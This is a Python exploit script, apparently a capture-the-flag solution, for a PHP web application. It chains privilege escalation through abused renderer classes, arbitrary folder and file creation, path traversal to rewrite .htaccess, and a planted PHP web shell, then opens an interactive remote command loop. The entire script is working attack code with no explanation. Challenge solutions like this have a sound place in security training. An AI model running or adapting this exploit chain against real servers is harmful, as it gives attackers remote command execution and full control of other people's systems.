import requests
import sys
import random
import string
import re
from base64 import b64encode

S = requests.Session()
chall_url = sys.argv[1]
folder_rce = "exploit"
folder_base = f"/var/www/html/public/pdf/{folder_rce}/"
file_rce = "exploit.php"
payload = "<?php var_dump(shell_exec($_GET['c'])); ?>"

def get_csrf_token(path):
    resp = S.get(f"{chall_url}/{path}", cookies=S.cookies.get_dict())
    return re.findall(r'\b\w{40}\b', resp.text)[0]

def get_b64_content():
    return b64encode(('[{"name":"'+''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase, k=5))+'","type":"email","size":"5"}]').encode()).decode()

# Initialize session
S.get(f"{chall_url}/")

# Login
S.post(f"{chall_url}/login",data={"_token": get_csrf_token(""), "email": "a@a.fr", "password":"a"}, cookies=S.cookies.get_dict())

# Step 1 - Privesc to admin
S.post(f"{chall_url}/form", json={"_token": get_csrf_token("form"), "content": get_b64_content(), "nb_fields": 1, "name": "admin", "renderer": "GuzzleHttp\\Cookie\\SessionCookieJar"}, cookies=S.cookies.get_dict())
S.get(f"{chall_url}/form?id=admin", cookies=S.cookies.get_dict())

if(S.get(f"{chall_url}/admin", allow_redirects=False, cookies=S.cookies.get_dict()).status_code == 200):
    print("[+] Privesc to admin: done")
else:
    print("[-] Privesc to admin failed...")
    sys.exit(-1)

# Step 2 - Arbitrary folder creation in /application/public/
S.post(f"{chall_url}/form", json={"_token": get_csrf_token("form"), "content": get_b64_content(), "nb_fields": 1, "name": folder_base, "renderer": "Mpdf\\Cache"}, cookies=S.cookies.get_dict())
S.get(f"{chall_url}/form?id={folder_base}", cookies=S.cookies.get_dict())

if(S.get(f"{chall_url}/pdf/exploit/", cookies=S.cookies.get_dict()).status_code == 403):
    print("[+] Arbitrary folder creation with 777 mode: done")
else:
    print("[-] Arbitrary folder creation with 777 mode: failed...")
    sys.exit(-1)

# Step 3 - Arbitrary file creation of exploit.php in previous folder
S.post(f"{chall_url}/form", json={"_token": get_csrf_token("form"), "content": get_b64_content(), "nb_fields": 1, "name": f"{folder_base}{file_rce}", "renderer": "GuzzleHttp\\Cookie\\FileCookieJar"}, cookies=S.cookies.get_dict())
S.get(f"{chall_url}/form?id={folder_base}{file_rce}", cookies=S.cookies.get_dict())

if(S.get(f"{chall_url}/pdf/exploit/exploit.php", cookies=S.cookies.get_dict()).status_code == 200):
    print("[+] Arbitrary file creation (exploit.php): done")
else:
    print("[-] Arbitrary file creation: failed...")
    sys.exit(-1)

# Step 4 - Arbitrary file creation of .htaccess in previous folder
S.post(f"{chall_url}/form", json={"_token": get_csrf_token("form"), "content": get_b64_content(), "nb_fields": 1, "name": f"{folder_base}.htaccess", "renderer": "GuzzleHttp\\Cookie\\FileCookieJar"}, cookies=S.cookies.get_dict())
S.get(f"{chall_url}/form?id={folder_base}.htaccess", cookies=S.cookies.get_dict())

if(S.get(f"{chall_url}/pdf/exploit/.htaccess", cookies=S.cookies.get_dict()).status_code == 500):
    print("[+] Arbitrary file creation (.htaccess): done")
else:
    print("[-] Arbitrary file creation (.htaccess): failed...")
    sys.exit(-1)

# Step 5 - Create a .htaccess in created folder to reactivate php
if(S.post(f"{chall_url}/admin/logs/template", data={"_token": get_csrf_token("form"), "template": "php_flag engine on", "file": f"../../../../../../../../{folder_base}/.htaccess"}, cookies=S.cookies.get_dict(), allow_redirects=False).status_code == 302):
    print("[+] Override created .htaccess file : done")
else:
    print("[-] Override created .htaccess file : failed...")
    sys.exit(-1)

# Step 6 - Trigger arbitrary write in previous created file
S.post(f"{chall_url}/admin/logs/template", data={"_token": get_csrf_token("form"), "template": payload, "file": f"../../../../../../../../{folder_base}{file_rce}"}, cookies=S.cookies.get_dict())

if("www-data" in S.get(f"{chall_url}/pdf/exploit/exploit.php?c=whoami", cookies=S.cookies.get_dict()).text):
    print(f"[+] RCE: done\nShell at: {chall_url}/pdf/exploit/exploit.php\nDropping shell...")
    while 1:
        cmd = input("linux> ")
        print(S.get(f"{chall_url}/pdf/exploit/exploit.php?c={cmd}", cookies=S.cookies.get_dict()).text.split('"')[1].split('"')[0])
else:
    print("[-] RCE: failed...")
    sys.exit(-1)